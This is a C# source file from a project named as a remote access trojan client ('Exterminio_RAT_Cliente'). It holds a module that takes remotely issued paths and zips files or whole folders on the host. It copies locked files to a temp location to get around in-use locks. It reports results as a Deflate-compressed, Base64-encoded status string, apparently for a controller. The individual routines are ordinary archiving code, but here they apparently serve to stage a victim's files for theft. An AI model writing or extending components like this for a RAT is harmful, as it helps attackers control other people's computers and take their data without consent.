using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading;

namespace Exterminio_RAT_Cliente
{
    public class CompressionRequest
    {
        public string RutaArchivo { get; set; }
        public string TipoElemento { get; set; } // "archivo" o "carpeta"
        public long TamañoOriginal { get; set; }
    }

    public class CompressionResponse
    {
        public string Estado { get; set; } // "completado", "fallido", "progreso"
        public string Mensaje { get; set; }
        public int Progreso { get; set; } // 0-100
        public string RutaArchivo { get; set; }
        public string RutaDestino { get; set; }
        public long TamañoOriginal { get; set; }
        public long TamañoComprimido { get; set; }

        public string ConvertirAString()
        {
            return $"{Estado}|{Mensaje}|{Progreso}|{RutaArchivo}|{RutaDestino}|{TamañoOriginal}|{TamañoComprimido}";
        }

        public string ComprimirYCodificar()
        {
            try
            {
                // Convertir a string
                string informacion = ConvertirAString();
                
                // Comprimir con Deflate
                byte[] datosOriginales = Encoding.UTF8.GetBytes(informacion);
                byte[] datosComprimidos;
                
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(outputStream, CompressionMode.Compress))
                    {
                        deflateStream.Write(datosOriginales, 0, datosOriginales.Length);
                    }
                    datosComprimidos = outputStream.ToArray();
                }
                
                // Convertir a Base64
                string base64String = Convert.ToBase64String(datosComprimidos);
                
                return base64String;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en compresión y codificación: {ex.Message}");
                return "";
            }
        }
    }

    public static class CompressionRequestProcessor
    {
        private static readonly Mutex compressionMutex = new Mutex(false, "CompressionMutex");

        public static CompressionResponse ProcesarSolicitudCompresion(string rutaArchivo)
        {
            try
            {
                Console.WriteLine($"🗜️ Procesando solicitud de compresión: {rutaArchivo}");
                
                // Verificar si el archivo o carpeta existe
                if (!File.Exists(rutaArchivo) && !Directory.Exists(rutaArchivo))
                {
                    return new CompressionResponse
                    {
                        Estado = "fallido",
                        Mensaje = "El archivo o carpeta no existe",
                        Progreso = 0,
                        RutaArchivo = rutaArchivo,
                        RutaDestino = "",
                        TamañoOriginal = 0,
                        TamañoComprimido = 0
                    };
                }

                // Usar mutex para asegurar que solo un proceso de compresión corra a la vez
                if (!compressionMutex.WaitOne(TimeSpan.FromSeconds(30)))
                {
                    return new CompressionResponse
                    {
                        Estado = "fallido",
                        Mensaje = "Timeout esperando mutex de compresión",
                        Progreso = 0,
                        RutaArchivo = rutaArchivo,
                        RutaDestino = "",
                        TamañoOriginal = 0,
                        TamañoComprimido = 0
                    };
                }

                try
                {
                    // Determinar si es archivo o carpeta
                    bool esArchivo = File.Exists(rutaArchivo);
                    bool esCarpeta = Directory.Exists(rutaArchivo);
                    
                    if (!esArchivo && !esCarpeta)
                    {
                        return new CompressionResponse
                        {
                            Estado = "fallido",
                            Mensaje = "No es un archivo ni carpeta válida",
                            Progreso = 0,
                            RutaArchivo = rutaArchivo,
                            RutaDestino = "",
                            TamañoOriginal = 0,
                            TamañoComprimido = 0
                        };
                    }

                    // Calcular tamaño original
                    long tamañoOriginal = CalcularTamaño(rutaArchivo);
                    
                    // Crear ruta de destino para el ZIP
                    string rutaDestino = CrearRutaDestino(rutaArchivo);
                    
                    Console.WriteLine($"Comprimiendo: {rutaArchivo} -> {rutaDestino}");
                    Console.WriteLine($"Tamaño original: {tamañoOriginal} bytes");

                    // Realizar la compresión
                    bool compresionExitosa = ComprimirElemento(rutaArchivo, rutaDestino, esCarpeta);
                    
                    if (compresionExitosa)
                    {
                        // Calcular tamaño del archivo comprimido
                        long tamañoComprimido = new FileInfo(rutaDestino).Length;
                        
                        Console.WriteLine($"Compresión exitosa: {tamañoComprimido} bytes");
                        
                        return new CompressionResponse
                        {
                            Estado = "completado",
                            Mensaje = $"Compresión completada exitosamente",
                            Progreso = 100,
                            RutaArchivo = rutaArchivo,
                            RutaDestino = rutaDestino,
                            TamañoOriginal = tamañoOriginal,
                            TamañoComprimido = tamañoComprimido
                        };
                    }
                    else
                    {
                        return new CompressionResponse
                        {
                            Estado = "fallido",
                            Mensaje = "Error durante la compresión",
                            Progreso = 0,
                            RutaArchivo = rutaArchivo,
                            RutaDestino = "",
                            TamañoOriginal = tamañoOriginal,
                            TamañoComprimido = 0
                        };
                    }
                }
                finally
                {
                    // Liberar el mutex
                    compressionMutex.ReleaseMutex();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando solicitud de compresión: {ex.Message}");
                return new CompressionResponse
                {
                    Estado = "fallido",
                    Mensaje = $"Error: {ex.Message}",
                    Progreso = 0,
                    RutaArchivo = rutaArchivo,
                    RutaDestino = "",
                    TamañoOriginal = 0,
                    TamañoComprimido = 0
                };
            }
        }

        private static long CalcularTamaño(string ruta)
        {
            try
            {
                if (File.Exists(ruta))
                {
                    return new FileInfo(ruta).Length;
                }
                else if (Directory.Exists(ruta))
                {
                    long tamaño = 0;
                    foreach (string archivo in Directory.GetFiles(ruta, "*", SearchOption.AllDirectories))
                    {
                        try
                        {
                            tamaño += new FileInfo(archivo).Length;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error calculando tamaño de {archivo}: {ex.Message}");
                        }
                    }
                    return tamaño;
                }
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error calculando tamaño: {ex.Message}");
                return 0;
            }
        }

        private static string CrearRutaDestino(string rutaOriginal)
        {
            try
            {
                string directorio = Path.GetDirectoryName(rutaOriginal);
                string nombre = Path.GetFileNameWithoutExtension(rutaOriginal);
                
                if (string.IsNullOrEmpty(nombre))
                {
                    nombre = "comprimido";
                }
                
                // Si es una carpeta, usar el nombre de la carpeta
                if (Directory.Exists(rutaOriginal))
                {
                    nombre = Path.GetFileName(rutaOriginal);
                    if (string.IsNullOrEmpty(nombre))
                    {
                        nombre = "carpeta_comprimida";
                    }
                }
                
                string rutaDestino = Path.Combine(directorio, $"{nombre}.zip");
                
                // Si el archivo ya existe, agregar número
                int contador = 1;
                while (File.Exists(rutaDestino))
                {
                    rutaDestino = Path.Combine(directorio, $"{nombre}_{contador}.zip");
                    contador++;
                }
                
                return rutaDestino;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creando ruta de destino: {ex.Message}");
                return Path.Combine(Path.GetDirectoryName(rutaOriginal), "comprimido.zip");
            }
        }

        private static bool ComprimirElemento(string rutaOrigen, string rutaDestino, bool esCarpeta)
        {
            try
            {
                if (esCarpeta)
                {
                    return ComprimirCarpeta(rutaOrigen, rutaDestino);
                }
                else
                {
                    return ComprimirArchivo(rutaOrigen, rutaDestino);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error comprimiendo elemento: {ex.Message}");
                return false;
            }
        }

        private static bool ComprimirArchivo(string rutaArchivo, string rutaDestino)
        {
            try
            {
                // Verificar si el archivo está en uso
                if (IsFileInUse(rutaArchivo))
                {
                    Console.WriteLine($"Archivo en uso, intentando copia temporal: {rutaArchivo}");
                    
                    // Crear una copia temporal del archivo
                    string tempFile = CreateTempCopy(rutaArchivo);
                    if (string.IsNullOrEmpty(tempFile))
                    {
                        Console.WriteLine("No se pudo crear copia temporal del archivo");
                        return false;
                    }
                    
                    try
                    {
                        // Comprimir la copia temporal
                        bool result = ComprimirArchivoInterno(tempFile, rutaDestino, Path.GetFileName(rutaArchivo));
                        
                        // Limpiar archivo temporal
                        try
                        {
                            if (File.Exists(tempFile))
                                File.Delete(tempFile);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error eliminando archivo temporal: {ex.Message}");
                        }
                        
                        return result;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error comprimiendo copia temporal: {ex.Message}");
                        return false;
                    }
                }
                else
                {
                    // Archivo no está en uso, comprimir directamente
                    return ComprimirArchivoInterno(rutaArchivo, rutaDestino, Path.GetFileName(rutaArchivo));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error comprimiendo archivo: {ex.Message}");
                return false;
            }
        }

        private static bool ComprimirArchivoInterno(string rutaArchivo, string rutaDestino, string nombreArchivo)
        {
            try
            {
                using (FileStream zipToCreate = new FileStream(rutaDestino, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zipToCreate, ZipArchiveMode.Create))
                    {
                        ZipArchiveEntry fileEntry = archive.CreateEntry(nombreArchivo);
                        
                        using (FileStream fileToCompress = new FileStream(rutaArchivo, FileMode.Open, FileAccess.Read, FileShare.Read))
                        {
                            using (Stream entryStream = fileEntry.Open())
                            {
                                fileToCompress.CopyTo(entryStream);
                            }
                        }
                    }
                }
                
                Console.WriteLine($"Archivo comprimido exitosamente: {rutaDestino}");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error comprimiendo archivo interno: {ex.Message}");
                return false;
            }
        }

        private static bool IsFileInUse(string filePath)
        {
            try
            {
                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.None))
                {
                    return false; // Archivo no está en uso
                }
            }
            catch
            {
                return true; // Archivo está en uso
            }
        }

        private static string CreateTempCopy(string originalFile)
        {
            try
            {
                string tempDir = Path.GetTempPath();
                string tempFileName = $"temp_compression_{Guid.NewGuid()}_{Path.GetFileName(originalFile)}";
                string tempFilePath = Path.Combine(tempDir, tempFileName);
                
                // Intentar copiar con diferentes estrategias
                try
                {
                    // Estrategia 1: Copia directa
                    File.Copy(originalFile, tempFilePath, true);
                    Console.WriteLine($"Copia temporal creada: {tempFilePath}");
                    return tempFilePath;
                }
                catch (Exception ex1)
                {
                    Console.WriteLine($"Estrategia 1 falló: {ex1.Message}");
                    
                    try
                    {
                        // Estrategia 2: Copia con FileShare.Read
                        using (FileStream source = new FileStream(originalFile, FileMode.Open, FileAccess.Read, FileShare.Read))
                        using (FileStream dest = new FileStream(tempFilePath, FileMode.Create))
                        {
                            source.CopyTo(dest);
                        }
                        Console.WriteLine($"Copia temporal creada (estrategia 2): {tempFilePath}");
                        return tempFilePath;
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine($"Estrategia 2 falló: {ex2.Message}");
                        return null;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error creando copia temporal: {ex.Message}");
                return null;
            }
        }

        private static bool ComprimirCarpeta(string rutaCarpeta, string rutaDestino)
        {
            try
            {
                using (FileStream zipToCreate = new FileStream(rutaDestino, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zipToCreate, ZipArchiveMode.Create))
                    {
                        string nombreCarpeta = Path.GetFileName(rutaCarpeta);
                        if (string.IsNullOrEmpty(nombreCarpeta))
                        {
                            nombreCarpeta = "carpeta";
                        }
                        
                        // Obtener todos los archivos en la carpeta y subcarpetas
                        string[] archivos = Directory.GetFiles(rutaCarpeta, "*", SearchOption.AllDirectories);
                        
                        foreach (string archivo in archivos)
                        {
                            // Calcular la ruta relativa para mantener la estructura de carpetas
                            string rutaRelativa = archivo.Substring(rutaCarpeta.Length).TrimStart('\\');
                            ZipArchiveEntry fileEntry = archive.CreateEntry(rutaRelativa);
                            
                            using (FileStream fileToCompress = new FileStream(archivo, FileMode.Open))
                            {
                                using (Stream entryStream = fileEntry.Open())
                                {
                                    fileToCompress.CopyTo(entryStream);
                                }
                            }
                        }
                    }
                }
                
                Console.WriteLine($"Carpeta comprimida exitosamente: {rutaDestino}");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error comprimiendo carpeta: {ex.Message}");
                return false;
            }
        }
    }
}
